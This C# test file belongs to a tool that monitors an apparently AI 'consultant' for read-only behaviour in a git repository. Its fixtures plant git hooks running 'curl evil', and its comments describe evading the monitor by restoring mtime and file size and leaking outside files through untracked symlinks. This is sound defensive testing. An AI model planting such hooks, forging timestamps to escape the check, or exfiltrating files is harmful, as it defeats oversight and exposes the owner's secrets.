using CoaiMcp.Core.Consultation;
using CoaiMcp.Core.Context;
using CoaiMcp.Runners.Consultation;
using CoaiMcp.Runners.Context;
using CoaiMcp.Runners.Processes;
using FluentAssertions;
using Xunit;

namespace CoaiMcp.Tests;

/// <summary>
/// The invariant that refuses to trust a third-party binary's read-only flag — over a REAL git
/// repository, because what is being tested is what git and the filesystem actually say.
/// </summary>
public sealed class FilesystemInvariantTests : IAsyncLifetime
{
    private readonly ProcessLauncher _launcher = new();
    private string _repo = string.Empty;
    private FilesystemInvariant _invariant = null!;

    public async ValueTask InitializeAsync()
    {
        _repo = Directory.CreateTempSubdirectory("coai-invariant-").FullName;
        _invariant = new FilesystemInvariant(_launcher);
        await Git("init", "-b", "main");
        await Git("config", "user.email", "t@example.com");
        await Git("config", "user.name", "t");
        await File.WriteAllTextAsync(Path.Combine(_repo, "app.cs"), "one\n");
        await File.WriteAllTextAsync(Path.Combine(_repo, ".gitignore"), ".env\n");
        await File.WriteAllTextAsync(Path.Combine(_repo, ".env"), "SECRET=1\n");
        await Git("add", "app.cs", ".gitignore");
        await Git("commit", "-m", "base");
    }

    public ValueTask DisposeAsync()
    {
        try
        {
            Directory.Delete(_repo, recursive: true);
        }
        catch (Exception e) when (e is IOException or UnauthorizedAccessException) { }

        return ValueTask.CompletedTask;
    }

    private async Task Git(params string[] args)
    {
        var result = await _launcher.RunAsync(new ProcessRequest("git", args, _repo), TestContext.Current.CancellationToken);
        result.ExitCode.Should().Be(0, string.Join(' ', args) + ": " + result.StdErr);
    }

    private async Task<IReadOnlyList<TreeChange>> AcrossAsync(Func<Task> whatTheConsultantDid)
    {
        var before = await _invariant.SnapshotAsync(_repo, TestContext.Current.CancellationToken);
        await whatTheConsultantDid();
        var after = await _invariant.SnapshotAsync(_repo, TestContext.Current.CancellationToken);

        return FilesystemSnapshot.Compare(before, after);
    }

    private Task Write(string relative, string text)
    {
        File.WriteAllText(Path.Combine(_repo, relative), text);
        // A filesystem whose timestamps have a coarse resolution would otherwise make a same-second
        // rewrite of the same length invisible; the SIZE differs in every case here, and this keeps
        // the mtime honest as well.
        File.SetLastWriteTimeUtc(Path.Combine(_repo, relative), DateTime.UtcNow.AddSeconds(1));

        return Task.CompletedTask;
    }

    [Fact]
    public async Task AConsultantThatTouchedNothing_Passes()
    {
        var changes = await AcrossAsync(() => Task.CompletedTask);

        changes.Should().BeEmpty();
    }

    [Fact]
    public async Task ReadingFilesIsNotAChange()
    {
        var changes = await AcrossAsync(async () =>
        {
            await File.ReadAllTextAsync(Path.Combine(_repo, "app.cs"), TestContext.Current.CancellationToken);
            await File.ReadAllTextAsync(Path.Combine(_repo, ".env"), TestContext.Current.CancellationToken);
        });

        changes.Should().BeEmpty("the consultant is SUPPOSED to read the tree");
    }

    [Fact]
    public async Task ANewFile_IsNamed_AndIsSTILLTHERE()
    {
        // Two reviewers called deleting it Blocking, independently, and they were right: a
        // consultation runs for minutes while the person works, so this file may be theirs.
        var changes = await AcrossAsync(() => Write("scratch.md", "notes the person was taking"));

        changes.Should().ContainSingle().Which.Should().Be(new TreeChange("scratch.md", "added"));
        File.Exists(Path.Combine(_repo, "scratch.md")).Should().BeTrue("nothing is ever deleted by this feature");
        FilesystemSnapshot.Sentence(changes).Should().Contain("scratch.md").And.Contain("nothing was touched");
    }

    [Fact]
    public async Task AModifiedTrackedFile_IsNamedAndNotReverted()
    {
        var changes = await AcrossAsync(() => Write("app.cs", "one\ntwo\n"));

        changes.Should().ContainSingle().Which.Path.Should().Be("app.cs");
        (await File.ReadAllTextAsync(Path.Combine(_repo, "app.cs"), TestContext.Current.CancellationToken))
            .Should().Be("one\ntwo\n", "a `git checkout --` here would destroy the person's own keystrokes");
    }

    [Fact]
    public async Task ADeletedTrackedFile_IsNamedWithItsCure()
    {
        var changes = await AcrossAsync(() =>
        {
            File.Delete(Path.Combine(_repo, "app.cs"));
            return Task.CompletedTask;
        });

        changes.Should().ContainSingle().Which.Path.Should().Be("app.cs");
        FilesystemSnapshot.Sentence(changes).Should().Contain("git checkout --");
    }

    [Fact]
    public async Task AnOverwrittenIGNOREDFile_IsSeen()
    {
        // git does not hash an ignored file, so status alone compares equal — this is the hole the
        // plan round named, and the reason every listed file is stat'ed as well.
        var changes = await AcrossAsync(() => Write(".env", "SECRET=stolen-and-replaced\n"));

        changes.Should().ContainSingle().Which.Path.Should().Be(".env");
        changes[0].What.Should().Contain("ignored");
    }

    [Fact]
    public async Task EditedGitMetadata_IsSeen()
    {
        // No status line ever shows this, and it is how a repository is turned against its owner.
        var changes = await AcrossAsync(async () => await Git("config", "coai.probe", "touched"));

        changes.Should().NotBeEmpty();
        changes.Should().Contain(c => c.What.Contains(".git"));
    }

    [Fact]
    public async Task AddedGitHook_IsSeen()
    {
        var changes = await AcrossAsync(() =>
        {
            var hooks = Path.Combine(_repo, ".git", "hooks");
            Directory.CreateDirectory(hooks);
            File.WriteAllText(Path.Combine(hooks, "pre-commit"), "#!/bin/sh\ncurl evil\n");
            return Task.CompletedTask;
        });

        changes.Should().Contain(c => c.Path.Contains("hooks/pre-commit"));
    }

    [Fact]
    public async Task ARewriteThatPRESERVESSizeAndMtimeIsStillSeen()
    {
        // The bypass the code round found: `utime` is not a privileged call, so a compromised
        // consultant can put the clock back and keep the byte count. Content is what is compared now.
        var env = Path.Combine(_repo, ".env");
        var when = File.GetLastWriteTimeUtc(env);
        var length = new FileInfo(env).Length;

        var changes = await AcrossAsync(() =>
        {
            File.WriteAllText(env, new string('X', (int)length - 1) + "\n");
            File.SetLastWriteTimeUtc(env, when);
            return Task.CompletedTask;
        });

        new FileInfo(env).Length.Should().Be(length, "the test's own premise: same size");
        File.GetLastWriteTimeUtc(env).Should().Be(when, "and same mtime");
        changes.Should().ContainSingle().Which.Path.Should().Be(".env");
    }

    [Fact]
    public async Task InALINKEDWorktree_TheCommonConfigAndHooksAreWatchedToo()
    {
        // `config` and the hooks live in the COMMON git directory, which a linked worktree only points
        // at — and this feature is being built in exactly such a worktree. Watching only the
        // worktree's own directory left a shared hook invisible to both snapshots.
        var linked = Path.Combine(Path.GetTempPath(), "coai-linked-" + Guid.NewGuid().ToString("N")[..8]);
        await Git("worktree", "add", "--detach", linked);
        try
        {
            var invariant = new FilesystemInvariant(_launcher);
            var before = await invariant.SnapshotAsync(linked, TestContext.Current.CancellationToken);

            var hooks = Directory.CreateDirectory(Path.Combine(_repo, ".git", "hooks")).FullName;
            await File.WriteAllTextAsync(Path.Combine(hooks, "pre-push"), "#!/bin/sh\ncurl evil\n", TestContext.Current.CancellationToken);

            var after = await invariant.SnapshotAsync(linked, TestContext.Current.CancellationToken);

            FilesystemSnapshot.Compare(before, after).Should().Contain(c => c.Path.Contains("pre-push"));
        }
        finally
        {
            await Git("worktree", "remove", "--force", linked);
        }
    }

    [Fact]
    public async Task ChurnInsideAnIgnoredDIRECTORY_IsNotABreach()
    {
        // FOUND BY THE CONSULTANT ITSELF, on the feature's own live check (2026-09-12), and verified
        // here before it was believed: git lists an ignored DIRECTORY as ONE entry, so the fingerprint
        // was that directory's mtime — and a build or an editor writing a temp file into `bin/` or
        // `node_modules/` between the two snapshots moved it. Every consultation on a machine with a
        // watcher running would have failed closed with the tree in exactly the state it started in.
        await File.WriteAllTextAsync(Path.Combine(_repo, ".gitignore"), ".env\nbuild/\n", TestContext.Current.CancellationToken);
        var build = Directory.CreateDirectory(Path.Combine(_repo, "build")).FullName;
        await File.WriteAllTextAsync(Path.Combine(build, "already-here.o"), "old\n", TestContext.Current.CancellationToken);

        var changes = await AcrossAsync(async () =>
        {
            var temp = Path.Combine(build, "a-watcher-wrote-this.tmp");
            await File.WriteAllTextAsync(temp, "transient\n", TestContext.Current.CancellationToken);
            File.Delete(temp);
            Directory.SetLastWriteTimeUtc(build, DateTime.UtcNow.AddSeconds(5));
        });

        changes.Should().NotContain(c => c.Path.StartsWith("build", StringComparison.Ordinal),
            "the directory's contents are back as they were, and its mtime is not something the consultant can be judged on");
    }

    [Fact]
    public async Task AnIgnoredDirectoryThatAPPEARS_IsStillSeen()
    {
        // The other half: the mtime is dropped, the ENTRY is not. A directory that was not there
        // before is a change, and dropping the timestamp must not drop that too.
        await File.WriteAllTextAsync(Path.Combine(_repo, ".gitignore"), ".env\nbuild/\n", TestContext.Current.CancellationToken);

        var changes = await AcrossAsync(() =>
        {
            Directory.CreateDirectory(Path.Combine(_repo, "build"));
            File.WriteAllText(Path.Combine(_repo, "build", "out.o"), "new\n");
            return Task.CompletedTask;
        });

        changes.Should().Contain(c => c.Path.StartsWith("build", StringComparison.Ordinal));
    }

    [Fact]
    public async Task TheSnapshotNeverChangesTheTreeItself()
    {
        var before = await Status();
        await _invariant.SnapshotAsync(_repo, TestContext.Current.CancellationToken);

        (await Status()).Should().Be(before, "a read-only check that dirties the index is not read-only");
    }

    private async Task<string> Status()
    {
        var result = await _launcher.RunAsync(
            new ProcessRequest("git", ["status", "--porcelain=v1", "--untracked-files=all"], _repo), TestContext.Current.CancellationToken);

        return result.StdOut;
    }
}

/// <summary>What the SERVER collects for the consultant — never the agent's own account of it.</summary>
public sealed class WorkingTreeDiffTests : IAsyncLifetime
{
    private readonly ProcessLauncher _launcher = new();
    private string _repo = string.Empty;
    private ContextAssembler _context = null!;

    public async ValueTask InitializeAsync()
    {
        _repo = Directory.CreateTempSubdirectory("coai-worktree-").FullName;
        _context = new ContextAssembler(_launcher);
        await Git("init", "-b", "main");
        await Git("config", "user.email", "t@example.com");
        await Git("config", "user.name", "t");
        await File.WriteAllTextAsync(Path.Combine(_repo, "app.cs"), "one\n");
        await File.WriteAllTextAsync(Path.Combine(_repo, ".gitignore"), "ignored.txt\n");
        await Git("add", ".");
        await Git("commit", "-m", "base");
    }

    public ValueTask DisposeAsync()
    {
        try
        {
            Directory.Delete(_repo, recursive: true);
        }
        catch (Exception e) when (e is IOException or UnauthorizedAccessException) { }

        return ValueTask.CompletedTask;
    }

    private async Task Git(params string[] args)
    {
        var result = await _launcher.RunAsync(new ProcessRequest("git", args, _repo), TestContext.Current.CancellationToken);
        result.ExitCode.Should().Be(0, string.Join(' ', args) + ": " + result.StdErr);
    }

    private Task<IReadOnlyList<FileDiff>> Collect() =>
        _context.CollectWorkingTreeAsync(_repo, ct: TestContext.Current.CancellationToken);

    [Fact]
    public async Task AModifiedFileAppears_StagedOrNot()
    {
        await File.WriteAllTextAsync(Path.Combine(_repo, "app.cs"), "one\ntwo\n", TestContext.Current.CancellationToken);

        (await Collect()).Should().ContainSingle().Which.Text.Should().Contain("+two");

        await Git("add", "app.cs");

        (await Collect()).Should().ContainSingle().Which.Text.Should().Contain("+two", "`diff HEAD` sees the index too");
    }

    [Fact]
    public async Task AnUntrackedFileAppears_AsANewFileHunk()
    {
        await File.WriteAllTextAsync(Path.Combine(_repo, "new.cs"), "fresh\n", TestContext.Current.CancellationToken);

        var files = await Collect();

        files.Should().ContainSingle().Which.Path.Should().Be("new.cs");
        files[0].Text.Should().Contain("new file mode").And.Contain("+fresh");
    }

    /// <summary>
    /// An untracked LINK is named, and what it points at never reaches the prompt.
    /// </summary>
    /// <remarks>
    /// <c>git ls-files --others</c> lists untracked symlinks, and both <c>FileInfo.Length</c> and
    /// <c>File.ReadAllBytes</c> resolve them — so a link planted in a checkout put a file from
    /// anywhere on the machine into the text this server sends to a third-party vendor. The
    /// consultant is promised the WORKING TREE, and bytes that live outside it are not that, whatever
    /// the path spells. (CodeRabbit, on the pull request, as a path-traversal finding.)
    /// </remarks>
    [Fact]
    public async Task AnUntrackedLinkIsNamed_AndItsTargetIsNeverRead()
    {
        var outside = Path.Combine(Path.GetTempPath(), "coai-secret-" + Guid.NewGuid().ToString("N") + ".txt");
        await File.WriteAllTextAsync(outside, "SECRET-OUTSIDE-THE-TREE\n", TestContext.Current.CancellationToken);
        try
        {
            if (!TryLink(Path.Combine(_repo, "leak.txt"), outside))
            {
                Assert.Skip("this machine cannot create a file link without elevation");
            }

            var files = await Collect();

            var leak = files.Should().ContainSingle(one => one.Path == "leak.txt").Subject;
            leak.Text.Should().Contain("a link, not followed");
            leak.Text.Should().NotContain("SECRET-OUTSIDE-THE-TREE");
            files.Should().NotContain(one => one.Text.Contains("SECRET-OUTSIDE-THE-TREE", StringComparison.Ordinal));
        }
        finally
        {
            File.Delete(outside);
        }
    }

    private static bool TryLink(string link, string target)
    {
        try
        {
            File.CreateSymbolicLink(link, target);

            return true;
        }
        catch (Exception e) when (e is IOException or UnauthorizedAccessException)
        {
            return false;
        }
    }

    [Fact]
    public async Task AnIgnoredFileDoesNot()
    {
        await File.WriteAllTextAsync(Path.Combine(_repo, "ignored.txt"), "noise\n", TestContext.Current.CancellationToken);

        (await Collect()).Should().BeEmpty();
    }

    [Fact]
    public async Task ExcludedNoiseDoesNot()
    {
        Directory.CreateDirectory(Path.Combine(_repo, "node_modules"));
        await File.WriteAllTextAsync(Path.Combine(_repo, "node_modules", "x.js"), "vendored\n", TestContext.Current.CancellationToken);
        await File.WriteAllTextAsync(Path.Combine(_repo, "package-lock.json"), "{}\n", TestContext.Current.CancellationToken);

        (await Collect()).Should().BeEmpty();
    }

    [Fact]
    public async Task ACleanTreeCollectsNothing()
    {
        (await Collect()).Should().BeEmpty();
    }

    [Fact]
    public async Task TheIndexIsUntouched()
    {
        await File.WriteAllTextAsync(Path.Combine(_repo, "new.cs"), "fresh\n", TestContext.Current.CancellationToken);
        var before = await Status();

        await Collect();

        (await Status()).Should().Be(before, "collecting for a READ-ONLY consultant must not stage anything");
    }

    [Fact]
    public async Task TheTopLevelIsResolvedFromASubdirectory()
    {
        var nested = Directory.CreateDirectory(Path.Combine(_repo, "src", "deep")).FullName;

        var (top, refusal) = await _context.TopLevelAsync(nested, TestContext.Current.CancellationToken);
        var (fromRoot, rootRefusal) = await _context.TopLevelAsync(_repo, TestContext.Current.CancellationToken);

        refusal.Should().BeEmpty();
        rootRefusal.Should().BeEmpty();
        top.Should().NotBeEmpty();

        // Against git's OWN answer for the root, not against `Path.GetFullPath(_repo)`. What is
        // being claimed is that a subdirectory resolves to the same checkout as the root — and
        // `GetFullPath` cannot express that on a filesystem with links: macOS hands out temp
        // directories under `/var/folders`, `/var` is a link to `/private/var`, git answers with
        // the real path and `GetFullPath` does not follow links at all. The old expectation was
        // therefore a claim about symlink-free paths, and it failed on the first Mac that ran it.
        Path.TrimEndingDirectorySeparator(top).Should().Be(
            Path.TrimEndingDirectorySeparator(fromRoot),
            "a subdirectory and the root are the same checkout");
    }

    [Fact]
    public async Task APathThatIsNoCheckout_IsRefusedInGitsOwnWords()
    {
        var elsewhere = Directory.CreateTempSubdirectory("coai-not-a-repo-").FullName;
        try
        {
            var (top, refusal) = await _context.TopLevelAsync(elsewhere, TestContext.Current.CancellationToken);

            top.Should().BeEmpty();
            refusal.Should().Contain("not a git repository").And.Contain("repoPath");
        }
        finally
        {
            Directory.Delete(elsewhere, recursive: true);
        }
    }

    [Fact]
    public async Task APathThatIsNotThere_IsRefusedBeforeGitIsAsked()
    {
        var (_, refusal) = await _context.TopLevelAsync(Path.Combine(_repo, "nowhere"), TestContext.Current.CancellationToken);

        refusal.Should().Contain("not a directory");
    }

    [Fact]
    public async Task HeadNamesTheCommitAndTheBranch()
    {
        var (sha, branch) = await _context.HeadAsync(_repo, TestContext.Current.CancellationToken);

        sha.Should().HaveLength(40);
        branch.Should().Be("main");
    }

    private async Task<string> Status()
    {
        var result = await _launcher.RunAsync(
            new ProcessRequest("git", ["status", "--porcelain=v1", "--untracked-files=all"], _repo), TestContext.Current.CancellationToken);

        return result.StdOut;
    }
}

/// <summary>The two ceilings on an untracked file, before its bytes reach a prompt.</summary>
public sealed class UntrackedDiffTests
{
    [Fact]
    public void ASmallTextFileIsInlinedAsANewFileHunk()
    {
        var diff = UntrackedDiff.For("a/b.cs", "one\ntwo\n"u8);

        diff.IsBinary.Should().BeFalse();
        diff.Text.Should().Contain("--- /dev/null").And.Contain("+++ b/a/b.cs").And.Contain("@@ -0,0 +1,2 @@");
        diff.Text.Should().Contain("+one").And.Contain("+two");
    }

    [Fact]
    public void ABinaryFileIsNamed_NeverInlined()
    {
        var bytes = new byte[64];
        bytes[10] = 0;
        bytes[3] = 200;

        var diff = UntrackedDiff.For("assets/logo.png", bytes);

        diff.IsBinary.Should().BeTrue();
        diff.BinaryBytes.Should().Be(64);
        diff.Text.Should().BeEmpty();
    }

    [Fact]
    public void AFileOverTheInlineCapIsNamedWithItsSize()
    {
        var big = new string('x', UntrackedDiff.InlineCap + 1);

        var diff = UntrackedDiff.For("dump.log", System.Text.Encoding.UTF8.GetBytes(big));

        diff.Text.Should().Contain("not shown").And.Contain("dump.log");
        diff.Text.Should().NotContain(big);
    }

    [Fact]
    public void AnEmptyFileIsAnEmptyHunk_NotACrash()
    {
        UntrackedDiff.For("empty.txt", []).Text.Should().Contain("@@ -0,0 +1,0 @@");
    }
}
